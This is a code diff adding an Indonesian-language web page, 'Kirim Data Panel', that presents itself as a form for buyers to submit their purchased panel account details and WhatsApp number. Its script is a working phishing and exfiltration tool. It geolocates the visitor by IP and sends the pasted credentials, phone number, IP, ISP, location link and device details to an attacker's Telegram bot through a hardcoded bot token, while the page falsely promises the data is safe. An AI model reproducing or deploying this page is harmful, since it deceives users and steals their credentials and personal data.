@@ -1,0 +1,124 @@
+<!DOCTYPE html><html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kirim Data Panel</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #0f172a;
+      color: white;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    h1 {
+      color: #38bdf8;
+    }
+    form {
+      background: #1e293b;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 0 10px #0ea5e9;
+      width: 100%;
+      max-width: 400px;
+    }
+    label {
+      font-weight: bold;
+      margin-top: 10px;
+      display: block;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 10px;
+      margin: 5px 0 15px;
+      border-radius: 8px;
+      border: none;
+      background: #334155;
+      color: white;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #0ea5e9;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .note {
+      margin-top: 10px;
+      text-align: center;
+      color: #94a3b8;
+      font-size: 14px;
+    }
+    .status {
+      margin-top: 15px;
+      color: #22c55e;
+      font-weight: bold;
+      text-align: center;
+    }
+  </style>
+</head>
+<body>
+  <h1>Kirim Data Panel</h1>
+  <form id="panelForm">
+    <label for="dataPanel">🌐 Masukan Data Panel:</label>
+    <textarea id="dataPanel" placeholder="Tempel disini data akun panel yang dikirim pas pembelian!!!" required></textarea><label for="nomorHP">📞 Masukan No. WhatsApp:</label>
+<input type="text" id="nomorHP" placeholder="Yang dipake buat beli Panelnya" required />
+
+<button type="submit">Kirim</button>
+<div class="note">Data 100% aman, karna Owner VPS langsung yang bisa liat!!!</div>
+<div class="status" id="status"></div>
+
+  </form>  <script>
+    const token = '7386917118:AAECxMEqvdZv4cOK4cV2F4CK3d8aTSCttpM';
+    const chatId = '7625804862';
+    let count = 0;
+
+    async function getIPInfo() {
+      const res = await fetch('https://ipapi.co/json');
+      return res.json();
+    }
+
+    document.getElementById('panelForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const dataPanel = document.getElementById('dataPanel').value.trim();
+      const nomorHP = document.getElementById('nomorHP').value.trim();
+      const status = document.getElementById('status');
+
+      if (!dataPanel || !nomorHP) {
+        status.textContent = 'Semua field wajib diisi!';
+        return;
+      }
+
+      status.textContent = 'Mengirim...';
+
+      try {
+        const ipInfo = await getIPInfo();
+        count++;
+
+        const locationLink = `https://www.google.com/maps?q=${ipInfo.latitude},${ipInfo.longitude}`;
+
+        const message = `Halo Tuan Samuel, Pencipta ku...\n[+] DATA BARU MASUK [+]\n\n🌐 Data Panel:\n${dataPanel}\n\n📞 No.WhatsApp: ${nomorHP}\n⚠️ IP: ${ipInfo.ip}\n🗾 Negara: ${ipInfo.country_name}\n🏢 Kota: ${ipInfo.city}, ${ipInfo.region}\n📱 Perangkat: ${navigator.userAgent}\n\n🚩 Lokasi: ${locationLink}\n\n⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️⚠️\n[ + ] Detail IP Address [ + ]\nISP: ${ipInfo.org}\nProvinsi: ${ipInfo.region}\nKode Pos: ${ipInfo.postal}\nZona Waktu: ${ipInfo.timezone}\nASN: ${ipInfo.asn}\n\nPencipta Bot: @SamXploit™ 🦅🔥\n\nTotal Pendaftar: ${count}`;
+
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+
+        status.textContent = 'Data berhasil dikirim!';
+        document.getElementById('panelForm').reset();
+      } catch (err) {
+        console.error(err);
+        status.textContent = 'Gagal mengirim data.';
+      }
+    });
+  </script></body>
+</html>
